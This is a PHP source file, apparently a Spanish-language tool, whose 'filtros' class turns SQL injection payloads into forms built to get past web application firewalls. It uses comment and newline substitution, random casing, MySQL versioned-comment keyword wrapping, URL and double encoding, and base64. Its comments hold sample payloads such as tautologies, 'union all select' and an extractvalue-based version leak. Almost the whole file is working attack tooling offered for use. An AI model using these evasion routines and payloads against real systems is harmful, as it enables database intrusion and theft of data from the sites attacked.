<?php



#tambien es un bypass /*!union*/ 
/*

1 && 0x31=0x31
1 %26%26 0x31=0x31

WHERE x = 'normalinput' group by x having 1=1 --

*/


class filtros 
{

	public function nuevalinea($query,$comenterio=null)
	{

		if(is_null($comenterio))
		{
			return preg_replace("/\s+/","%0A",$query);
		}
		else
		{
			return preg_replace("/\s+/","--%0A",$query);
		}

	}

	public function comentarios($query)
	{
		return preg_replace("/\s+/","/**/",$query);
	}



	public function letrasrandom($query,$htmlencode=null)
	{
		$texto=str_split($query);
		if(preg_match("/[a-zA-Z]/",$query))
		{
			for ($i=0; $i < count($texto); $i++)
			{ 
				if(preg_match("/[a-zA-Z]/",$texto[$i]))
				{
					if(rand(1,2)==1)
					{ 
						$texto[$i] = strtoupper($texto[$i]); //cambiar a mayusculas
						
					}
					elseif (!is_null($htmlencode) and rand(1,2)==1)
					{
						if(rand(1,2)==1)
						{
							$texto[$i]="%".bin2hex(strtoupper($texto[$i]));
						}
						else
						{
							$texto[$i]="%".bin2hex(strtolower($texto[$i]));
						}
					}
					else
					{
						$texto[$i] = strtolower($texto[$i]); //cambiar a minusculas
						
					}

				}
			}
		}
		
		return implode("",$texto);
	}




	#Filtro para Bypassear el WAF  #MEJORAR WAF
	 public function waf($query,$nivel=null)
		{

			return preg_replace(
			array(
			"/\s+/",
			"/group_concat\(/i",
			"/unhex\(/i",
			"/hex\(/i",
			"/\/concat\(/i",
			"/\,concat\(/i",
			"/\(concat\(/i",
			"/@@datadir/i",
			"/user\(/i",
			"/database\(/i",
			"/@@HOSTNAME/i",
			"/UUID\(/i",
			"/@@max_allowed_packet/i",
			"/version\(/i",
			"/@@global\.time_zone/i",
			"/SYSDATE\(/i",
			"/if\(/i",
			"/select/i",
			"/privilege_type/i",
			"/from/i",
			"/where/i",
			"/grantee\=/i",
			"/count\(/i",
			"/limit/i",
			"/\/all\//i",
			"/\/union\//i",
			"/union\//i",
			"/\/order\//i",
			"/\/by\//i",
			"/\/group\//i",
			"/\/not\//i",
			"/\/as\//i",
			"/sleep\(/i",
			"/floor\(/i",
			"/rand\(/i",
			"/row\(/i",
			"/elt\(/i"
			),


			array(
			"/**/",
			"/*!00000gROuP_cOnCAt(*/",
			"/*!00000UnHEx*//**/(",
			"/*!00000HeX*//**/(",
			"//*!00000CoNCaT*//**/(",
			",/*!00000CoNCaT*//**/(",
			"(/*!00000CoNCaT*//**/(",
			"@@DaTAdIr",
			"/*!00000UsEr*//**/(",
			"/*!00000daTAbAsE*//**/(",
			"@@HoStnaME",
			"/*!00000UuId(*/",
			"@@mAx_AlloWeD_pAcKEt",
			"/*!00000vErSiOn*//**/(",
			"@@glOBal/**/.tIMe_ZonE",
			"/*!00000SysDaTe(*/",
			"/*!00000iF*//**/(",
			"/*!00000sElECt*/",
			"PRivILegE_tYpE",
			"/*!00000fRoM*/",
			"/*!00000WhErE*/",
			"GrAnTEe/**/=",
			"/*!00000coUnT(*/",
			"/*!00000lImIT*/",
			"//*!00000aLl*//",
			"//*!00000UNiOn*//",
			"/*!00000UNiOn*//",
			"//*!00000OrDEr*//",
			"//*!00000By*//",
			"//*!00000gROuP*//",
			"//*!00000nOt*//",
			"//*!00000aS*//",
			"/*!00000SLeeP/**/(*/",
			"/*!00000FlOOr(*/",
			"/*!00000rAnD(*/",
			"/*!00000RoW(*/",
 			"/*!00000eLt(*/"
			),

			$query);

		}



		#SIRVE PARA ENCODEAR TODOS LOS CARACTERES EN HTMLENCODER Y SI QUIERES HACER DOBLE ENCODING HABILITAR EL 2 PARAPETROS CON 1
		public function htmlencode($texto,$dobleEncoding=null)
		{

			if(is_null($dobleEncoding))
			{

				return preg_replace(

					array('/\x25/','/\s/','/\x61/','/\x62/','/\x63/','/\x64/','/\x65/','/\x66/','/\x67/','/\x68/','/\x69/','/\x6a/','/\x6b/','/\x6c/','/\x6d/','/\x6e/','/\ñ/','/\x6f/','/\x70/','/\x71/','/\x72/','/\x73/','/\x74/','/\x75/','/\x76/','/\x77/','/\x78/','/\x79/','/\x7a/','/\x41/','/\x42/','/\x43/','/\x44/','/\x45/','/\x46/','/\x47/','/\x48/','/\x49/','/\x4a/','/\x4b/','/\x4c/','/\x4d/','/\x4e/','/\Ñ/','/\x4f/','/\x50/','/\x51/','/\x52/','/\x53/','/\x54/','/\x55/','/\x56/','/\x57/','/\x58/','/\x59/','/\x5a/','/\á/','/\é/','/\í/','/\ó/','/\ú/','/\Á/','/\É/','/\Í/','/\Ó/','/\Ú/','/\ä/','/\ë/','/\ï/','/\ö/','/\ü/','/\Ä/','/\Ë/','/\Ï/','/\Ö/','/\Ü/','/\x5c/','/\//','/\#/','/\¡/','/\?/','/\=/','/\)/','/\(/','/\&/','/\$/','/\#/','/\!/','/\"/','/\)/','/\¨/','/\*/','/\[/','/\]/','/\;/','/\:/','/\_/','/\>/','/\</','/\´/' /*,'/\+/'*/,'/\{/','/\}/','/\-/','/\./','/\,/','/\|/','/\¿/','/\'/','/\!/','/\~/','/\^/','/\`/','/\@/','/\¬/'),

					array('%25','%20','%61','%62','%63','%64','%65','%66','%67','%68','%69','%6a','%6b','%6c','%6d','%6e','%f1','%6f','%70','%71','%72','%73','%74','%75','%76','%77','%78','%79','%7a','%41','%42','%43','%44','%45','%46','%47','%48','%49','%4a','%4b','%4c','%4d','%4e','%d1','%4f','%50','%51','%52','%53','%54','%55','%56','%57','%58','%59','%5a','%e1','%e9','%ed','%f3','%fa','%c1','%c9','%cd','%d3','%da','%e4','%eb','%ef','%f6','%fc','%c4','%cb','%cf','%d6','%dc','%5c','%2f','%23','%a1','%3f','%3d','%29','%28','%26','%24','%23','%21','%22','%29','%a8','%2a','%5b','%5d','%3b','%3a','%5f','%3e','%3c','%b4' /*,'%2b'*/,'%7b','%7d','%2d','%2e','%2c','%7c','%bf','%27','%21','%7e','%5e','%60','%40','%ac'),

						$texto);
			}
			else
			{
				return preg_replace(
						
					array('/\s/','/\x61/','/\x62/','/\x63/','/\x64/','/\x65/','/\x66/','/\x67/','/\x68/','/\x69/','/\x6a/','/\x6b/','/\x6c/','/\x6d/','/\x6e/','/\ñ/','/\x6f/','/\x70/','/\x71/','/\x72/','/\x73/','/\x74/','/\x75/','/\x76/','/\x77/','/\x78/','/\x79/','/\x7a/','/\x41/','/\x42/','/\x43/','/\x44/','/\x45/','/\x46/','/\x47/','/\x48/','/\x49/','/\x4a/','/\x4b/','/\x4c/','/\x4d/','/\x4e/','/\Ñ/','/\x4f/','/\x50/','/\x51/','/\x52/','/\x53/','/\x54/','/\x55/','/\x56/','/\x57/','/\x58/','/\x59/','/\x5a/','/\á/','/\é/','/\í/','/\ó/','/\ú/','/\Á/','/\É/','/\Í/','/\Ó/','/\Ú/','/\ä/','/\ë/','/\ï/','/\ö/','/\ü/','/\Ä/','/\Ë/','/\Ï/','/\Ö/','/\Ü/','/\x5c/','/\//','/\#/','/\¡/','/\?/','/\=/','/\)/','/\(/','/\&/','/\$/','/\#/','/\!/','/\"/','/\)/','/\¨/','/\*/','/\[/','/\]/','/\;/','/\:/','/\_/','/\>/','/\</','/\´/' /*,'/\+/'*/,'/\{/','/\}/','/\-/','/\./','/\,/','/\|/','/\¿/','/\'/','/\!/','/\~/','/\^/','/\`/','/\@/','/\¬/','/\x25/'),

					array('%20','%61','%62','%63','%64','%65','%66','%67','%68','%69','%6a','%6b','%6c','%6d','%6e','%f1','%6f','%70','%71','%72','%73','%74','%75','%76','%77','%78','%79','%7a','%41','%42','%43','%44','%45','%46','%47','%48','%49','%4a','%4b','%4c','%4d','%4e','%d1','%4f','%50','%51','%52','%53','%54','%55','%56','%57','%58','%59','%5a','%e1','%e9','%ed','%f3','%fa','%c1','%c9','%cd','%d3','%da','%e4','%eb','%ef','%f6','%fc','%c4','%cb','%cf','%d6','%dc','%5c','%2f','%23','%a1','%3f','%3d','%29','%28','%26','%24','%23','%21','%22','%29','%a8','%2a','%5b','%5d','%3b','%3a','%5f','%3e','%3c','%b4'/*,'%2b'*/,'%7b','%7d','%2d','%2e','%2c','%7c','%bf','%27','%21','%7e','%5e','%60','%40','%ac','%25'),


					$texto);
			}


		}


		public function encode64($texto,$decoder=null)
		{
			if(is_null($decoder))
			{
				return base64_encode($texto);
			}
			else
			{
				return base64_decode($texto,true);	
			}
		}




}




#echo $filtro->encode64("union all select  1,2,3"); #	dW5pb24gYWxsIHNlbGVjdCAgMSwyLDM=
#echo $filtro->comentarios("union all select  1,2,3"); #	union/**/all/**/select/**/1,2,3
#echo $filtro->waf("union all select  1,2,3"); #	//*!00000UNiOn*///**//*!00000aLl*//**//*!00000sElECt*//**/1,2,3
#echo $filtro->htmlencode("union all select  1,2,3"); #%75%6e%69%6f%6e%20%61%6c%6c%20%73%65%6c%65%63%74%20%201%2c2%2c3
#echo $filtro->htmlencode("union all select  1,2,3",1); # doble encode = %2575%256e%2569%256f%256e%2520%2561%256c%256c%2520%2573%2565%256c%2565%2563%2574%2520%25201%252c2%252c3
#echo $filtro->nuevalinea("union all select  1,2,3",1); #	union--%0Aall--%0Aselect--%0A1,2,3
#echo $filtro->nuevalinea("union all select  1,2,3"); #	union%0Aall%0Aselect%0A1,2,3
#echo $filtro->letrasrandom("union all select  1,2,3");  #convierte la letras a-z en mayuscula o minusculan aleatoriamente --> UNIoN aLL sELECt  1,2,3
#echo $filtro->letrasrandom("union all select  1,2,3",1); #convierte la letras a-z en mayuscula o minusculan o htmlencode aleatoriamente  U%6eiO%6e AL%6c s%65%6ceCT  1,2,3

#echo $filtro->waf("or (extractvalue(0x0a,concat(0x0a,(Concat(0x2a7c3e,version(),0x3c7c2a)))))");


//echo $filtro->letrasrandom(" asdasd asdasd sadsad",1);






